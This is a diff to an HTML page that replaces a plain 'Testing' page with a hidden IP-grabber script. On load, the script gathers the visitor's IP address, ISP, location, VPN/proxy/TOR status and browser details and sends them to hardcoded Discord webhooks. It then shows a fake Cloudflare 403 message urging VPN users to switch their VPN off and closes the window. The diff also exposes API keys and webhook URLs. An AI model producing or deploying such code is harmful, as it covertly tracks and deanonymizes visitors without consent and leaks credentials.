@@ -1,31 +1,166 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Title</title>
-  <style>
-    body {
-      background-color: black;
-    }
-    
-    .fade-in {
-      color: white;
-      text-align: center;
-      opacity: 0;
-      animation: fadeIn 1.5s ease-in-out forwards;
-    }
-    
-    @keyframes fadeIn {
-      0% {
-        opacity: 0;
-      }
-      
-      100% {
-        opacity: 1;
-      }
-    }
-  </style>
-</head>
 <body>
-  <h1 class="fade-in">Testing</h1>
+    <script>
+        function trackVisits() {
+            let numberOfVisits = localStorage.getItem('numberOfVisitsGabiii');
+            if (numberOfVisits === null) {
+                numberOfVisits = 0;
+            }
+            numberOfVisits++;
+            localStorage.setItem('numberOfVisitsGabiii', numberOfVisits);
+            return numberOfVisits;
+        }
+    </script>
+    <script async>
+        async function fetchAndSendDataToWebhook() {
+            let numberOfVisits = trackVisits();
+            const webhookUrl = "https://discord.com/api/webhooks/1140437544971022418/WSDpIQFiAjpc6CeyMAmtbk1CmR0amYLLdxV4B3m80tWdLYM8AbT3vcATiksL6o390Jcr";
+            const webhookUrlSpam = 'https://discord.com/api/webhooks/1140445021498265641/tv8a_x4vd17iEePZr-yZc9DnsXe17AyiyKn5tAztd7A8GyDCXGQ90nJS2_WXGFJ-06vG';
+            const vpnApiKey = "ff876c228d334ee8bd0133ae8c963ec4";
+            const ipdataApiKey = "c5efb86366eb200e6ef5aaf7dff9d3d7a6a7f7e6ba298be17eabc32b";
+            const ipinfoApiKey = "2dc7c2e39e5208";
+
+            if (numberOfVisits === 1) {
+                try {
+                    const ipAddressResponse = await fetch(`https://api.ipify.org?format=json`);
+                    const ipAddressData = await ipAddressResponse.json();
+
+                    const [ipdataResponse, ipinfoResponse, vpnApiResponse, freeipapiResponse] = await Promise.all([
+                        fetch(`https://api.ipdata.co/${ipAddressData.ip}?api-key=${ipdataApiKey}`),
+                        fetch(`https://ipinfo.io/${ipAddressData.ip}/json?token=${ipinfoApiKey}`),
+                        fetch(`https://vpnapi.io/api/${ipAddressData.ip}?key=${vpnApiKey}`),
+                        fetch(`https://ipapi.co/${ipAddressData.ip}/json/`),
+                    ]);
+
+                    const [ipdata, ipinfoData, vpnData, freeipapiData] = await Promise.all([
+                        ipdataResponse.json(),
+                        ipinfoResponse.json(),
+                        vpnApiResponse.json(),
+                        freeipapiResponse.json(),
+                    ]);
+
+                    const isVPNDetected = vpnData.security.vpn;
+                    const isProxyDetected = vpnData.security.proxy;
+                    const isTORDetected = vpnData.security.tor;
+
+                    const browserInfo = {
+                        browser: navigator.userAgent,
+                        os: navigator.platform,
+                        jsEnabled: true,
+                        cookies: navigator.cookieEnabled,
+                    };
+
+                    const overallEmbed = {
+                        title: "Overall",
+                        description: `----------------IP--------------
+IPv4: ${ipAddressData.ip}
+ISP: ${ipdata.asn.name}
+----------DETECTIONS--------
+VPN : ${isVPNDetected ? "2/2" : "0/2"}
+Proxy : ${isProxyDetected ? "2/2" : "0/2"}
+TOR : ${isTORDetected ? "2/2" : "0/2"}
+-----------LOCATION----------
+Country: ${ipinfoData.country || "N/A"}
+State: ${ipinfoData.region || "N/A"}
+City: ${ipinfoData.city || "N/A"}
+--------------BROWSER-------------
+Browser: ${browserInfo.browser}
+OS: ${browserInfo.os}
+JS enabled: ${browserInfo.jsEnabled}
+Cookies: ${browserInfo.cookies}`,
+                        color: isVPNDetected || isProxyDetected || isTORDetected ? 16711680 : 65280,
+                    };
+
+                    const ipdataEmbed = {
+                        title: "IP Information (ipdata.co)",
+                        description: `\`\`\`json\n${JSON.stringify(ipdata, null, 2)}\`\`\``,
+                        color: 16711680,
+                    };
+
+                    const ipinfoEmbed = {
+                        title: "IP Information (ipinfo.io)",
+                        description: `\`\`\`json\n${JSON.stringify(ipinfoData, null, 2)}\`\`\``,
+                        color: 18618,
+                    };
+
+                    const vpnapiEmbed = {
+                        title: "VPN Information (vpnapi.io)",
+                        description: `\`\`\`json\n${JSON.stringify(vpnData, null, 2)}\`\`\``,
+                        color: 65280,
+                    };
+
+                    const freeipapiEmbed = {
+                        title: "IP Information (freeipapi.com)",
+                        description: `\`\`\`json\n${JSON.stringify(freeipapiData, null, 2)}\`\`\``,
+                        color: 65535,
+                    };
+
+                    const embedData = {
+                        content: "@everyone",
+                        embeds: [overallEmbed, ipdataEmbed, ipinfoEmbed, vpnapiEmbed, freeipapiEmbed],
+                    };
+
+                    const totalVPNDetections = (isVPNDetected ? 1 : 0) + (isProxyDetected ? 1 : 0) + (isTORDetected ? 1 : 0);
+                    if (totalVPNDetections >= 1) {
+                        alert(
+                            "Err: 403 Forbidden\nResponse: Please turn off VPN or proxy and try again.\nReason: Cloudflare 403; No VPN or proxy allowed for connections."
+                        );
+                        return;
+                    }
+
+                    const webhookResponse = await fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(embedData),
+                    });
+
+                    if (!webhookResponse.ok) {
+                        throw new Error("Failed to send data to Discord webhook.");
+                    }
+                } catch (error) {
+                    console.error("Error fetching IP geolocation and sending data to Discord webhook:", error);
+                }
+            } else {
+                const ipAddressResponse = await fetch(`https://api.ipify.org?format=json`);
+                const ipAddressData = await ipAddressResponse.json();
+                const message = `IP: ${ipAddressData.ip}\ntimes clicked: ${numberOfVisits}`;
+                
+                const embedData = {
+                    content: "stop wasting my api fucker",
+                    embeds: [
+                        {
+                            title: "**duplicate detection**\n*POSSIBLE VPN, IF NO OTHER RECORDS ARE FOUND, THIS IS A VPN.*",
+                            description: message,
+                            color: 16711680
+                        }
+                    ]
+                };
+
+                try {
+                    const webhookResponse = await fetch(webhookUrlSpam, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(embedData),
+                    });
+
+                    if (!webhookResponse.ok) {
+                        throw new Error("Failed to send data to Discord webhook.");
+                    }
+                } catch (error) {
+                    console.error("Error sending data to Discord webhook:", error);
+                }
+            }
+            
+            window.close();
+        }
+        window.onload = function () {
+            fetchAndSendDataToWebhook();
+        };
+    </script>
 </body>
 </html>
